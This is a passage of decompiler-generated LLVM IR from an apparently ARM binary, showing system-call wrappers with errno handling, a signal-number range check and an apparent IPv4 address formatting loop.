  %v7_146d4 = load i32, i32* %v6_146d4, align 4
  ret i32 %v7_146d4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_146e8(i8* %arg1) local_unnamed_addr {
dec_label_pc_146e8:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r5, align 4
  %v3_146f0 = icmp eq i8* %arg1, null
  store i32 180260, i32* @r4, align 4
  br i1 %v3_146f0, label %dec_label_pc_14714, label %dec_label_pc_14700

dec_label_pc_14700:                               ; preds = %dec_label_pc_146e8
  %v2_14700 = load i8, i8* %arg1, align 1
  %v2_14704 = icmp eq i8 %v2_14700, 0
  br i1 %v2_14704, label %dec_label_pc_14714, label %dec_label_pc_14720

dec_label_pc_14714:                               ; preds = %dec_label_pc_14700, %dec_label_pc_146e8
  br label %dec_label_pc_14720

dec_label_pc_14720:                               ; preds = %dec_label_pc_14700, %dec_label_pc_14714
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_238ba.762 to i32), %dec_label_pc_14714 ], [ 145592, %dec_label_pc_14700 ]
  store i32 %storemerge, i32* @r6, align 4
  %v0_14720 = call i32 @function_17a38()
  %v1_14724 = inttoptr i32 %v0_14720 to i32*
  %v2_14724 = load i32, i32* %v1_14724, align 4
  %v2_14728 = icmp ugt i32 %v2_14724, 3
  %v7_14728 = icmp eq i32 %v2_14724, 4
  %v2_1472c = xor i1 %v7_14728, true
  %v3_1472c = and i1 %v2_14728, %v2_1472c
  br i1 %v3_1472c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_14720
  %v4_14730 = load i32, i32* @r4, align 4
  %v6_14730 = add i32 %v4_14730, -34684
  store i32 %v6_14730, i32* @ip, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14720, %bb
  %v2_14734 = xor i1 %v2_14728, true
  %v3_14734 = or i1 %v7_14728, %v2_14734
  br i1 %v3_14734, label %bb16, label %._crit_edge

._crit_edge:                                      ; preds = %.thread4
  %v0_1475c.pre = load i32, i32* @ip, align 4
  %v0_14748.pre = load i32, i32* @r4, align 4
  br label %bb17

bb16:                                             ; preds = %.thread4
  %v4_14738 = load i32, i32* @r4, align 4
  %v6_14738 = add i32 %v4_14738, -20
  %v8_1473c = mul i32 %v2_14724, 4
  %v9_1473c = add i32 %v6_14738, %v8_1473c
  %v10_1473c = inttoptr i32 %v9_1473c to i32*
  %v11_1473c = load i32, i32* %v10_1473c, align 4
  store i32 %v11_1473c, i32* @ip, align 4
  br label %bb17

bb17:                                             ; preds = %._crit_edge, %bb16
  %v0_14748 = phi i32 [ %v0_14748.pre, %._crit_edge ], [ %v4_14738, %bb16 ]
  %v0_1475c = phi i32 [ %v0_1475c.pre, %._crit_edge ], [ %v11_1473c, %bb16 ]
  %v2_14748 = add i32 %v0_14748, 92
  %v3_14748 = inttoptr i32 %v2_14748 to i32*
  %v4_14748 = load i32, i32* %v3_14748, align 4
  %v1_14750 = inttoptr i32 %v4_14748 to i32*
  %v2_14750 = load i32, i32* %v1_14750, align 4
  store i32 %v2_14750, i32* @r0, align 4
  %v0_14754 = load i32, i32* @r5, align 4
  %v0_14758 = load i32, i32* @r6, align 4
  %v7_14760 = call i32 @function_180f4(i32 %v2_14750, i32 ptrtoint ([8 x i8]* @global_var_23834.767 to i32), i32 %v0_14754, i32 %v0_14758, i32 %v0_1475c)
  ret i32 %v7_14760

; uselistorder directives
  uselistorder i1 %v7_14728, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_14720, { 1, 0 }
}

define i32 @function_14788() local_unnamed_addr {
dec_label_pc_14788:
  %v3_14788 = load i32, i32* @r4, align 4
  %v6_14788 = load i32, i32* @r5, align 4
  %v9_14788 = load i32, i32* @r6, align 4
  %v12_14788 = load i32, i32* @r7, align 4
  %v15_14788 = load i32, i32* @r8, align 4
  %v18_14788 = load i32, i32* @sb, align 4
  %v21_14788 = load i32, i32* @sl, align 4
  %v24_14788 = load i32, i32* @fp, align 4
  %v0_1478c = load i32, i32* @r0, align 4
  %v5_147a8 = call i32 @llvm.bswap.i32(i32 %v0_1478c)
  %v0_147ac = load i32, i32* @r1, align 4
  %v1_147ac = add i32 %v0_147ac, 15
  store i32 %v1_147ac, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_147e8

dec_label_pc_147cc:                               ; preds = %dec_label_pc_147e8
  %v1_147d4 = inttoptr i32 %v0_14804 to i8*
  %v2_147d4 = call i32 @function_1878c(i8* %v1_147d4)
  %v0_147d8 = load i32, i32* @r6, align 4
  %v2_147d8 = icmp eq i32 %v0_147d8, 0
  %v1_147dc = add i32 %v2_147d4, -1
  store i32 %v1_147dc, i32* @r1, align 4
  br i1 %v2_147d8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_147cc
  %v1_147e0 = load i32, i32* @sl, align 4
  %v2_147e0 = trunc i32 %v1_147e0 to i8
  %v4_147e0 = inttoptr i32 %v0_147d8 to i8*
  store i8 %v2_147e0, i8* %v4_147e0, align 1
  %v0_147e4.pre = load i32, i32* @r1, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_147cc, %bb
  %v0_147e4 = phi i32 [ %v1_147dc, %dec_label_pc_147cc ], [ %v0_147e4.pre, %bb ]
  store i32 %v0_147e4, i32* @r6, align 4
  %v0_147e8.pre = load i32, i32* @r5, align 4
  %v0_147ec.pre = load i32, i32* @r7, align 4
  %v1_147ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_147e8

dec_label_pc_147e8:                               ; preds = %dec_label_pc_14788, %bb17
  %v0_14804 = phi i32 [ %v1_147ac, %dec_label_pc_14788 ], [ %v0_147e4, %bb17 ]
  %v1_147ec = phi i32 [ %v5_147a8, %dec_label_pc_14788 ], [ %v1_147ec.pre, %bb17 ]
  %v0_147ec = phi i32 [ 255, %dec_label_pc_14788 ], [ %v0_147ec.pre, %bb17 ]
  %v0_147fc = phi i32 [ 0, %dec_label_pc_14788 ], [ %v0_147e8.pre, %bb17 ]
  %v7_147e8 = icmp eq i32 %v0_147fc, 3
  store i1 %v7_147e8, i1* @cpsr_z, align 1
  %v2_147ec = and i32 %v0_147ec, %v1_147ec
  store i32 %v2_147ec, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_147f8 = udiv i32 %v1_147ec, 256
  store i32 %v3_147f8, i32* @r4, align 4
  %v1_147fc = add i32 %v0_147fc, 1
  store i32 %v1_147fc, i32* @r5, align 4
  %v7_14800 = icmp sgt i32 %v0_147fc, 3
  br i1 %v7_14800, label %dec_label_pc_14804, label %dec_label_pc_147cc

dec_label_pc_14804:                               ; preds = %dec_label_pc_147e8
  %v1_14804 = add i32 %v0_14804, 1
  store i32 %v3_14788, i32* @r4, align 4
  store i32 %v6_14788, i32* @r5, align 4
  store i32 %v9_14788, i32* @r6, align 4
  store i32 %v12_14788, i32* @r7, align 4
  store i32 %v15_14788, i32* @r8, align 4
  store i32 %v18_14788, i32* @sb, align 4
  store i32 %v21_14788, i32* @sl, align 4
  store i32 %v24_14788, i32* @fp, align 4
  ret i32 %v1_14804

; uselistorder directives
  uselistorder i32 %v0_147fc, { 2, 0, 1 }
  uselistorder i32 %v0_147e4, { 1, 0 }
  uselistorder i32 (i8*)* @function_1878c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_147e8, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_14814(i32 %arg1) local_unnamed_addr {
dec_label_pc_14814:
  store i32 ptrtoint (i32* @global_var_328c8.771 to i32), i32* @r1, align 4
  %v0_14824 = call i32 @function_14788()
  %v0_14828 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14828, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14814
  %v1_14828 = load i32, i32* @r1, align 4
  %v5_14828 = mul i32 %v0_14824, 65536
  %v6_14828 = and i32 %v1_14828, %v5_14828
  store i32 %v6_14828, i32* @r7, align 4
  %v2_1482c = load i32, i32* @r4, align 4
  %v5_1482c = udiv i32 %v2_1482c, 131072
  %v6_1482c = and i32 %v5_1482c, %v0_14824
  store i32 %v6_1482c, i32* @r6, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14814, %bb
  ret i32 %v0_14824

; uselistorder directives
  uselistorder i32 %v0_14824, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14830(i32 %arg1) local_unnamed_addr {
dec_label_pc_14830:
  %stack_var_-12 = alloca i32, align 4
  %v2_14838 = ptrtoint i32* %stack_var_-12 to i32
  %v0_1483c = load i32, i32* @r0, align 4
  %v2_1483c = inttoptr i32 %v0_1483c to i8*
  %v3_1483c = call i32 @function_1a278(i8* %v2_1483c, i32 %v2_14838)
  %v2_14840 = icmp eq i32 %v3_1483c, 0
  %v4_14844 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_14840, i32 -1, i32 %v4_14844
  ret i32 %storemerge
}

define i32 @function_14858(i32 %arg1) local_unnamed_addr {
dec_label_pc_14858:
  store i32 2, i32* @r1, align 4
  %v0_14864 = call i32 @function_14874()
  ret i32 %v0_14864
}

define i32 @function_14874() local_unnamed_addr {
dec_label_pc_14874:
  %stack_var_-20 = alloca i32, align 4
  %v3_14874 = load i32, i32* @r4, align 4
  %v6_14874 = load i32, i32* @r5, align 4
  %v0_1487c = load i32, i32* @r0, align 4
  store i32 %v0_1487c, i32* @r4, align 4
  %v0_14880 = load i32, i32* @r1, align 4
  store i32 %v0_14880, i32* @r5, align 4
  %v0_14884 = call i32 @function_17a38()
  %v0_148ac = load i32, i32* @r4, align 4
  %v2_148b0 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_148b0, i32* @ip, align 4
  %v0_148b4 = load i32, i32* @r5, align 4
  %v8_148bc = call i32 @function_1a370(i32 %v0_148ac, i32 %v0_148b4, i32* inttoptr (i32 207504 to i32*), i32 ptrtoint (i32* @global_var_328d8.775 to i32), i32 440, i32 %v2_148b0, i32 %v0_14884)
  %v3_148c0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_14874, i32* @r4, align 4
  store i32 %v6_14874, i32* @r5, align 4
  ret i32 %v3_148c0
}

define i32 @function_148d4(i16* %arg1) local_unnamed_addr {
dec_label_pc_148d4:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_148d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_148d4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_148d4
  %v1_148d4 = load i32, i32* @r6, align 4
  %v2_148d4 = trunc i32 %v1_148d4 to i16
  store i16 %v2_148d4, i16* %arg1, align 2
  %v5_148d4 = load i32, i32* @r4, align 4
  %v6_148d4 = load i32, i32* %r0.global-to-local, align 4
  %v7_148d4 = sub i32 %v6_148d4, %v5_148d4
  store i32 %v7_148d4, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_148d4, %bb
  %v9_148d8 = phi i32 [ %tmp, %dec_label_pc_148d4 ], [ %v7_148d4, %bb ]
  ret i32 %v9_148d8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_148dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_148dc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_148dc = load i32, i32* @r7, align 4
  store i32 %v3_148dc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14904, label %dec_label_pc_148f4

dec_label_pc_148f4:                               ; preds = %dec_label_pc_148dc
  %v0_148f4 = call i32 @function_12b24()
  %v0_148f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_148f8 = sub i32 0, %v0_148f8
  %v2_148fc = inttoptr i32 %v0_148f4 to i32*
  store i32 %v1_148f8, i32* %v2_148fc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_14908.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14904

dec_label_pc_14904:                               ; preds = %dec_label_pc_148dc, %dec_label_pc_148f4
  %v2_14908 = phi i32 [ %v3_148dc, %dec_label_pc_148dc ], [ %v2_14908.pre, %dec_label_pc_148f4 ]
  %v0_14904 = phi i32 [ %arg1, %dec_label_pc_148dc ], [ -1, %dec_label_pc_148f4 ]
  store i32 %v2_14908, i32* @r7, align 4
  ret i32 %v0_14904

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14904, { 1, 0 }
}

define i32 @function_14914(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14914:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14914 = load i32, i32* @r7, align 4
  store i32 %v3_14914, i32* %stack_var_-8, align 4
  %v0_14920 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14920, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14920, -4095
  br i1 %tmp, label %dec_label_pc_14940, label %dec_label_pc_14930

dec_label_pc_14930:                               ; preds = %dec_label_pc_14914
  %v0_14930 = call i32 @function_12b24()
  %v0_14934 = load i32, i32* %r7.global-to-local, align 4
  %v1_14934 = sub i32 0, %v0_14934
  %v2_14938 = inttoptr i32 %v0_14930 to i32*
  store i32 %v1_14934, i32* %v2_14938, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14940.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14940

dec_label_pc_14940:                               ; preds = %dec_label_pc_14914, %dec_label_pc_14930
  %v1_14944 = phi i32 [ %v0_14920, %dec_label_pc_14914 ], [ -1, %dec_label_pc_14930 ]
  %v2_14940 = phi i32 [ %v3_14914, %dec_label_pc_14914 ], [ %v2_14940.pre, %dec_label_pc_14930 ]
  store i32 %v2_14940, i32* @r7, align 4
  ret i32 %v1_14944

; uselistorder directives
  uselistorder i32 %v0_14920, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14940, { 1, 0 }
}

define i32 @function_1494c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1494c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14980, label %dec_label_pc_14970

dec_label_pc_14970:                               ; preds = %dec_label_pc_1494c
  %v0_14970 = call i32 @function_12b24()
  %v0_14974 = load i32, i32* %r4.global-to-local, align 4
  %v1_14974 = sub i32 0, %v0_14974
  %v2_14978 = inttoptr i32 %v0_14970 to i32*
  store i32 %v1_14974, i32* %v2_14978, align 4
  br label %dec_label_pc_14980

dec_label_pc_14980:                               ; preds = %dec_label_pc_1494c, %dec_label_pc_14970
  %v1_14988 = phi i32 [ %arg1, %dec_label_pc_1494c ], [ -1, %dec_label_pc_14970 ]
  ret i32 %v1_14988

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14980, { 1, 0 }
}

define i32 @function_14990(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14990:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14990 = load i32, i32* @r7, align 4
  store i32 %v3_14990, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_149b8, label %dec_label_pc_149a8

dec_label_pc_149a8:                               ; preds = %dec_label_pc_14990
  %v0_149a8 = call i32 @function_12b24()
  %v0_149ac = load i32, i32* %r7.global-to-local, align 4
  %v1_149ac = sub i32 0, %v0_149ac
  %v2_149b0 = inttoptr i32 %v0_149a8 to i32*
  store i32 %v1_149ac, i32* %v2_149b0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_149bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_149b8

dec_label_pc_149b8:                               ; preds = %dec_label_pc_14990, %dec_label_pc_149a8
  %v2_149bc = phi i32 [ %v3_14990, %dec_label_pc_14990 ], [ %v2_149bc.pre, %dec_label_pc_149a8 ]
  %v0_149b8 = phi i32 [ %arg1, %dec_label_pc_14990 ], [ -1, %dec_label_pc_149a8 ]
  store i32 %v2_149bc, i32* @r7, align 4
  ret i32 %v0_149b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_149b8, { 1, 0 }
}

define i32 @function_149c8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_149c8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_149c8 = load i32, i32* @r7, align 4
  store i32 %v3_149c8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_149f0, label %dec_label_pc_149e0

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149c8
  %v0_149e0 = call i32 @function_12b24()
  %v0_149e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_149e4 = sub i32 0, %v0_149e4
  %v2_149e8 = inttoptr i32 %v0_149e0 to i32*
  store i32 %v1_149e4, i32* %v2_149e8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_149f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_149f0

dec_label_pc_149f0:                               ; preds = %dec_label_pc_149c8, %dec_label_pc_149e0
  %v2_149f4 = phi i32 [ %v3_149c8, %dec_label_pc_149c8 ], [ %v2_149f4.pre, %dec_label_pc_149e0 ]
  %v0_149f0 = phi i32 [ %arg1, %dec_label_pc_149c8 ], [ -1, %dec_label_pc_149e0 ]
  store i32 %v2_149f4, i32* @r7, align 4
  ret i32 %v0_149f0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_149f0, { 1, 0 }
}

define i32 @function_14a00(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14a00:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14a00 = load i32, i32* @r4, align 4
  store i32 %v3_14a00, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14a30, label %dec_label_pc_14a20

dec_label_pc_14a20:                               ; preds = %dec_label_pc_14a00
  %v0_14a20 = call i32 @function_12b24()
  %v0_14a24 = load i32, i32* %r4.global-to-local, align 4
  %v1_14a24 = sub i32 0, %v0_14a24
  %v2_14a28 = inttoptr i32 %v0_14a20 to i32*
  store i32 %v1_14a24, i32* %v2_14a28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14a34.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_14a30

dec_label_pc_14a30:                               ; preds = %dec_label_pc_14a00, %dec_label_pc_14a20
  %v2_14a34 = phi i32 [ %v3_14a00, %dec_label_pc_14a00 ], [ %v2_14a34.pre, %dec_label_pc_14a20 ]
  %v0_14a30 = phi i32 [ %arg1, %dec_label_pc_14a00 ], [ -1, %dec_label_pc_14a20 ]
  store i32 %v2_14a34, i32* @r4, align 4
  ret i32 %v0_14a30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14a30, { 1, 0 }
}

define i32 @function_14a40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14a40:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14a74, label %dec_label_pc_14a64

dec_label_pc_14a64:                               ; preds = %dec_label_pc_14a40
  %v0_14a64 = call i32 @function_12b24()
  %v0_14a68 = load i32, i32* %r4.global-to-local, align 4
  %v1_14a68 = sub i32 0, %v0_14a68
  %v2_14a6c = inttoptr i32 %v0_14a64 to i32*
  store i32 %v1_14a68, i32* %v2_14a6c, align 4
  br label %dec_label_pc_14a74

dec_label_pc_14a74:                               ; preds = %dec_label_pc_14a40, %dec_label_pc_14a64
  %v1_14a7c = phi i32 [ %arg1, %dec_label_pc_14a40 ], [ -1, %dec_label_pc_14a64 ]
  ret i32 %v1_14a7c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a74, { 1, 0 }
}

define i32 @function_14a84(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14a84:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a84 = load i32, i32* @r7, align 4
  store i32 %v3_14a84, i32* %stack_var_-8, align 4
  %v0_14a90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14a90, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14a90, -4095
  br i1 %tmp, label %dec_label_pc_14ab0, label %dec_label_pc_14aa0

dec_label_pc_14aa0:                               ; preds = %dec_label_pc_14a84
  %v0_14aa0 = call i32 @function_12b24()
  %v0_14aa4 = load i32, i32* %r7.global-to-local, align 4
  %v1_14aa4 = sub i32 0, %v0_14aa4
  %v2_14aa8 = inttoptr i32 %v0_14aa0 to i32*
  store i32 %v1_14aa4, i32* %v2_14aa8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14ab0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14ab0

dec_label_pc_14ab0:                               ; preds = %dec_label_pc_14a84, %dec_label_pc_14aa0
  %v1_14ab4 = phi i32 [ %v0_14a90, %dec_label_pc_14a84 ], [ -1, %dec_label_pc_14aa0 ]
  %v2_14ab0 = phi i32 [ %v3_14a84, %dec_label_pc_14a84 ], [ %v2_14ab0.pre, %dec_label_pc_14aa0 ]
  store i32 %v2_14ab0, i32* @r7, align 4
  ret i32 %v1_14ab4

; uselistorder directives
  uselistorder i32 %v0_14a90, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ab0, { 1, 0 }
}

define i32 @function_14abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_14abc:
  store i32 %arg1, i32* @r0, align 4
  %v3_14abc = load i32, i32* @r4, align 4
  %v0_14ac4 = call i32 @function_12648()
  %v2_14acc = call i32 @function_12838(i32 %v0_14ac4, i32 %arg1)
  store i32 %v3_14abc, i32* @r4, align 4
  ret i32 %v2_14acc

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_12838, { 0, 2, 1 }
  uselistorder i32 ()* @function_12648, { 0, 3, 2, 1 }
}

define i32 @function_14ad8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14ad8:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_14af0, label %dec_label_pc_14ae8

dec_label_pc_14ae8:                               ; preds = %dec_label_pc_14ad8
  %v7_14aec = icmp slt i32 %arg1, 65
  br i1 %v7_14aec, label %dec_label_pc_14b04, label %dec_label_pc_14af0

dec_label_pc_14af0:                               ; preds = %dec_label_pc_14ae8, %dec_label_pc_14ad8
  %v0_14af0 = call i32 @function_12b24()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14afc = inttoptr i32 %v0_14af0 to i32*
  store i32 22, i32* %v2_14afc, align 4
  %v0_14b0c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14b0c

dec_label_pc_14b04:                               ; preds = %dec_label_pc_14ae8
  %v0_14b04 = call i32 @function_14c0c()
  store i32 %v0_14b04, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14b0c

dec_label_pc_14b0c:                               ; preds = %dec_label_pc_14af0, %dec_label_pc_14b04
  %v0_14b0c = phi i32 [ %v0_14b0c.pre, %dec_label_pc_14af0 ], [ %v0_14b04, %dec_label_pc_14b04 ]
  ret i32 %v0_14b0c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b0c, { 1, 0 }
}

define i32 @function_14b1c(i32* %arg1) local_unnamed_addr {
dec_label_pc_14b1c:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_14b24 = add i32 %tmp, 4
  %v3_14b24 = inttoptr i32 %v2_14b24 to i32*
  store i32 0, i32* %v3_14b24, align 4
  %v1_14b28 = load i32, i32* %r3.global-to-local, align 4
  %v2_14b28 = inttoptr i32 %v1_14b28 to i32*
  store i32 0, i32* %v2_14b28, align 4
  ret i32 0
}

define i32 @function_14b30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14b30:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14b30 = load i32, i32* @r4, align 4
  store i32 %v3_14b30, i32* %stack_var_-16, align 4
  %v6_14b30 = load i32, i32* @r5, align 4
  %v9_14b30 = load i32, i32* @r6, align 4
  %v7_14b38 = icmp eq i32 %arg2, -1
  br i1 %v7_14b38, label %.thread4, label %bb

.thread4:                                         ; preds = %dec_label_pc_14b30
  br label %.thread16

bb:                                               ; preds = %dec_label_pc_14b30
  %v2_14b40 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_14b5c

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14b64

dec_label_pc_14b5c:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 180260, i32* @r6, align 4
  %v7_14b60 = icmp slt i32 %arg1, 65
  br i1 %v7_14b60, label %dec_label_pc_14b78, label %dec_label_pc_14b64

dec_label_pc_14b64:                               ; preds = %.thread16, %dec_label_pc_14b5c
  %v0_14b64 = call i32 @function_12b24()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14b70 = inttoptr i32 %v0_14b64 to i32*
  store i32 22, i32* %v2_14b70, align 4
  %v0_14bd0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_14b78:                               ; preds = %dec_label_pc_14b5c
  %v2_14b78 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14b78, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_14b80 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_14b80, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_14b90 = call i32 @function_14c0c()
  %v0_14b98 = load i32, i32* @r5, align 4
  %v0_14b9c = load i32, i32* @r6, align 4
  %v2_14b9c = add i32 %v0_14b9c, 27432
  %v2_14ba0 = call i32 @function_14be8(i32 %v2_14b9c, i32 %v0_14b98)
  store i32 %v2_14b40, i32* %r2.global-to-local, align 4
  %v0_14bb8 = load i32, i32* @r5, align 4
  %v3_14bc0 = call i32 @function_17364(i32 %v0_14bb8, i32 %v2_14b78, i32 %v2_14b40)
  %v1_14bc4 = icmp slt i32 %v3_14bc0, 0
  br i1 %v1_14bc4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_14b78
  %v5_14bc8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_14bc8, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_14b78
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_14b64, %bb32
  %v0_14bd0 = phi i32 [ %v5_14bc8, %bb31 ], [ %v0_14bd0.pre, %dec_label_pc_14b64 ], [ -1, %bb32 ]
  %v2_14bd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14bd8, i32* @r4, align 4
  store i32 %v6_14b30, i32* @r5, align 4
  store i32 %v9_14b30, i32* @r6, align 4
  ret i32 %v0_14bd0

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 ()* @function_14c0c, { 1, 0 }
  uselistorder i32 65, { 1, 2, 4, 3, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14b64, { 1, 0 }
}

define i32 @function_14be8(i32 %arg1, i32 %arg2) local_unnamed_addr {
